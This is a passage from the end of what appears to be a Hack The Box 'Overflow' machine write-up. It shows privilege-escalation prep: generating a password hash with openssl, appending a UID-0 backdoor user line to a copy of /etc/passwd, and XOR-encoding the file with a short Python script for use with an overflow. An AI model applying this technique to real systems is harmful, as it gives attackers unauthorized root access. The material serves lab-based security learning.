<p>Create the new hash for user <code v-pre>caue</code> with password <code v-pre>pass123</code>:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">$ openssl passwd -1 -salt caue pass123
$1$caue$UbuBXypuA7ZQh9kxbERnQ/</code></pre>
</doc-codeblock></div>
<p>Make a copy of <code v-pre>/etc/passwd</code> and add our user with root privileges:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">tester@overflow:~$ cp /etc/passwd /tmp/passwd
tester@overflow:~$ echo 'caue:$1$caue$UbuBXypuA7ZQh9kxbERnQ/:0:0:root:/root:/bin/bash' &gt;&gt; /tmp/passwd
</code></pre>
</doc-codeblock></div>
<p>Next we encrypt our modified <code v-pre>/tmp/passwd</code> file. To do this, I wrote a simple python script:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<div class="codeblock-title">encrypt_file.py</div>
<pre class="language-python"><code v-pre class="language-python">#!/usr/bin/python3

source = open('/tmp/passwd', 'rb').read()  
dest = open('/tmp/passwd2', 'wb')

for i in source:  
dest.write(bytes([i ^ 0x9b]))</code></pre>
</doc-codeblock></div>
<p>Running the script give us a file called <code v-pre>passwd2</code> which is encrypted:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">tester@overflow:/tmp$ python3 encrypt_file.py</code></pre>
</doc-codeblock></div>
<p>Now we’re ready to run the <code v-pre>file_encrypt</code> program with our overflow.</p>
<doc-anchor-target id="root">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#root">#</doc-anchor-trigger>
        <span>Root</span>
    </h2>
</doc-anchor-target>
<p><figure class="content-center">
    <img src="images/image14.png" alt="" />
    <figcaption class="caption"></figcaption>
</figure>
</p>

                                
                                <!-- Required only on API pages -->
                                <doc-toolbar-member-filter-no-results />
                            </div>
                            <footer class="clear-both">
                            
                                <nav class="flex mt-14">
                                    <div class="w-1/2">
                                        <a class="px-5 py-4 h-full flex items-center break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-l-lg transition-colors duration-150 relative hover:z-5" href="/writeups/htb/machines/">
                                            <svg xmlns="http://www.w3.org/2000/svg" class="mr-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19 11H7.41l5.29-5.29a.996.996 0 10-1.41-1.41l-7 7a1 1 0 000 1.42l7 7a1.024 1.024 0 001.42-.01.996.996 0 000-1.41L7.41 13H19c.55 0 1-.45 1-1s-.45-1-1-1z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
                                            <span>
                                                <span class="block text-xs font-normal text-gray-400 dark:text-dark-400">Previous</span>
                                                <span class="block mt-1">Machines</span>
                                            </span>
                                        </a>
                                    </div>
                            
                                    <div class="w-1/2">
                                        <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-r-lg transition-colors duration-150 relative hover:z-5" href="/writeups/oswe-prep/homeless/">
                                            <span>
                                                <span class="block text-xs font-normal text-right text-gray-400 dark:text-dark-400">Next</span>
                                                <span class="block mt-1">Homeless</span>
                                            </span>
                                            <svg xmlns="http://www.w3.org/2000/svg" class="ml-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19.92 12.38a1 1 0 00-.22-1.09l-7-7a.996.996 0 10-1.41 1.41l5.3 5.3H5c-.55 0-1 .45-1 1s.45 1 1 1h11.59l-5.29 5.29a.996.996 0 000 1.41c.19.2.44.3.7.3s.51-.1.71-.29l7-7c.09-.09.16-.21.21-.33z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
                                        </a>
                                    </div>
                                </nav>
                            </footer>
                        </main>
                
                        <div class="border-t dark:border-dark-650 pt-6 mb-8">
                            <footer class="flex flex-wrap items-center justify-between">
                                <div>
                                    <ul class="flex flex-wrap items-center text-sm">
                                    </ul>
                                </div>
                                <div class="docs-copyright py-2 text-gray-500 dark:text-dark-350 text-sm leading-relaxed"><p>© Copyright 2022. Caue All rights reserved.</p></div>
                            </footer>
                        </div>
                    </div>
                
                    <!-- Rendered if sidebar right is enabled -->
                    <!-- Sidebar right skeleton-->
                    <div v-cloak class="fixed top-0 bottom-0 right-0 translate-x-full bg-white border-gray-200 lg:sticky lg:border-l lg:shrink-0 lg:pt-6 lg:transform-none sm:w-1/2 lg:w-64 lg:z-0 md:w-104 sidebar-right skeleton dark:bg-dark-850 dark:border-dark-650">
                        <div class="pl-5">
                            <div class="w-32 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
                            <div class="w-48 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
                            <div class="w-40 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
                        </div>
                    </div>
                
                    <!-- User should be able to hide sidebar right -->
                    <doc-sidebar-right v-cloak></doc-sidebar-right>
                </div>

            </div>
        </div>
    
        <doc-search-mobile></doc-search-mobile>
        <doc-back-to-top></doc-back-to-top>
    </div>


    <div id="docs-overlay-target"></div>

    <script>window.__DOCS__ = { "title": "Overflow", icon: "file", hasPrism: true, hasMermaid: false, hasMath: false }</script>
</body>
</html>
